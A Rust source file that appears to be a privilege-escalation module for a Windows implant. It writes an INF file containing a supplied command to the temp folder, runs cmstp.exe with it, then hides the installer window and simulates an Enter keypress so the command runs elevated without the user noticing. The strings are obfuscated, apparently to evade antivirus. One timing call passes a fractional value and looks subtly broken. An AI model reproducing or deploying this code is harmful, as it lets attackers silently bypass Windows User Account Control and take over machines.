use enigo::{Direction::Click, Enigo, Key, Keyboard, Settings};
use rand::distributions::{Alphanumeric, DistString};
use std::ffi::CString;
use std::os::raw::{c_char, c_int, c_void};
use std::path::Path;
use std::process::Command;
use std::{fs, str};
use std::{thread, time};
use windows_sys::Win32::UI::WindowsAndMessaging::*;


type GoCallback = extern "C" fn(*const c_char, c_int) -> c_int;


#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

pub fn execute(cmd_location: &str) -> c_int {
    let cmstp_location = cryptify::encrypt_string!("c:\\Windows\\System32\\cmstp.exe");
    if !Path::new(&cmstp_location).exists() {
        return 1;
    }

    let mut inf_data = String::new();
    inf_data.push_str(&cryptify::encrypt_string!("[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\n; Commands Here will be run Before Setup Begins to install\r\nREPLACE_COMMAND_LINE\r\ntaskkill /IM cmstp.exe /F\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n\r\n[Strings]\r\nServiceName=\"CorpVPN\"\r\nShortSvcName=\"CorpVPN\"\r\n\r\n"));

    inf_data = inf_data.replace("REPLACE_COMMAND_LINE", cmd_location);

    let inf_path: String = format!(
        "{}{}",
        cryptify::encrypt_string!("c:\\windows\\temp\\"),
        format!("{}.inf", Alphanumeric.sample_string(&mut rand::thread_rng(), goldberg::goldberg_int!(16)))
    );

    fs::write(&inf_path, inf_data).expect(&cryptify::encrypt_string!("error writing to the file"));

    Command::new(&cmstp_location)
        .args([cryptify::encrypt_string!("/au"), inf_path])
        .spawn();

    thread::sleep(time::Duration::from_secs(goldberg::goldberg_int!(3)));
    if set_window_active() {
        return 0;
    } else {
        return 1;
    }
}

fn set_window_active() -> bool {
    let mut enigo: Enigo = Enigo::new(&Settings::default()).unwrap();
    let mut window_handle: *mut c_void = std::ptr::null_mut();

    let mut loop_limit = 10;
    loop {
        window_handle = unsafe {
            FindWindowA(
                std::ptr::null(),
                CString::new(cryptify::encrypt_string!("Microsoft Connection Manager Profile Installer")).unwrap().as_ptr() as *const u8,
            )
        };
        if !window_handle.is_null() {
            break;
        }
        loop_limit = loop_limit - 1;
        if loop_limit == 0 {
            return false;
        }
        thread::sleep(time::Duration::from_secs(0.3));
    }
    if !window_handle.is_null() {
        unsafe {
            SetForegroundWindow(window_handle);
            ShowWindow(window_handle, goldberg::goldberg_int!(0));
        }
        enigo.key(Key::Return, Click);
    }
    return true;
}
